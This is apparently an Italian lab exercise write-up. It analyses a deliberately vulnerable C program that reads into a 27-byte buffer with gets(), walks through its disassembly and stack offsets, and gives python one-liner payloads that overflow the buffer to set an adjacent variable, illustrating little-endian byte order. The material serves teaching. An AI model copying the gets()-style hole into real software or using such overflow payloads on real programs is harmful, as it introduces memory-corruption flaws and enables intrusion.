# Esercizio 2

## Codice C di Riferimento

```c
#include <stdio.h>

int main(int argc, char* argv[]){
    int pluto;
    char buf[27];

    pluto = 0;
    gets(buf);

    if (pluto == 0x414243){
        printf("Ottimo! Hai modificato correttamente la variabile\n");
    }
    else{
        printf("Sbagliato! Pluto vale: 0x%08x\n", pluto);
    }
}
```

## Analisi Assembly

Un possibile disassemblaggio può mostrare:

```
0x0804846b <+0>:  lea 0x4(%esp),%ecx
0x0804846f <+4>:  and $0xfffffff0,%esp
0x08048472 <+7>:  pushl -0x4(%ecx)
0x08048475 <+10>: push %ebp
0x08048476 <+11>: mov %esp,%ebp
-> 0x08048478 <+13>: push %ecx
-> 0x08048479 <+14>: sub $0x24,%esp
-> 0x0804847c <+17>: movl $0x0,-0xc(%ebp)
-> 0x08048483 <+24>: sub $0xc,%esp
-> 0x08048486 <+27>: lea -0x27(%ebp),%eax
0x08048489 <+30>: push %eax
0x0804848a <+31>: call 0x8048330 <gets@plt>
0x0804848f <+36>: add $0x10,%esp
-> 0x08048492 <+39>: cmpl $0x414243,-0xc(%ebp)
0x08048499 <+46>: jne 0x80484ad <main+66>
0x0804849b <+48>: sub $0xc,%esp
0x0804849e <+51>: push $0x8048550
0x080484a3 <+56>: call 0x8048340 <puts@plt>
0x080484a8 <+61>: add $0x10,%esp
0x080484ab <+64>: jmp 0x80484c0 <main+85>
0x080484ad <+66>: sub $0x8,%esp
0x080484b0 <+69>: pushl -0xc(%ebp)
0x080484b3 <+72>: push $0x8048584
0x080484b8 <+77>: call 0x8048320 <printf@plt>
0x080484bd <+82>: add $0x10,%esp
0x080484c0 <+85>: mov $0x0,%eax
0x080484c5 <+90>: mov -0x4(%ebp),%ecx
0x080484c8 <+93>: leave
0x080484c9 <+94>: lea -0x4(%ecx),%esp
0x080484cc <+97>: ret
```

### Allocazione nello Stack

- `pluto` si trova a `-0xc(%ebp)`
- Il buffer `buf` inizia a `-0x27(%ebp)`

Calcoliamo la distanza:

```
0x27 - 0xc = 0x1b (27 in decimale)
```

Serve scrivere 27 byte prima di sovrascrivere `pluto`.

### Confronto con 0x414243

A riga <+39>, viene eseguito:

```
cmp 0x414243, -0xc(%ebp)
```

`0x414243` in ASCII è `ABC`.

Se forziamo:
```bash
python3 -c 'print("A"*27 + "ABC")' | ./esercizio2
```

Output:
```
Sbagliato! Pluto vale: 0x00434241
```

A causa della **little endian** (Intel x86), i byte `ABC` vengono memorizzati come `CBA`. Quindi, effettivamente `pluto` = `0x00434241`.

### Soluzione: Inserire `CBA`

Per settare `pluto = 0x414243`, dobbiamo inserire `CBA (0x434241)` nel payload:

```bash
python3 -c 'print("A"*27 + "CBA")' | ./esercizio2
```
O, analogamente:

```bash
python3 -c 'print("A"*27 + "\x43\x42\x41")' | ./esercizio2
```

Output:
```
Ottimo! Hai modificato correttamente la variabile
```

Questo dimostra che per impostare un valore esadecimale specifico in un ambiente little endian, bisogna invertire l'ordine dei byte.

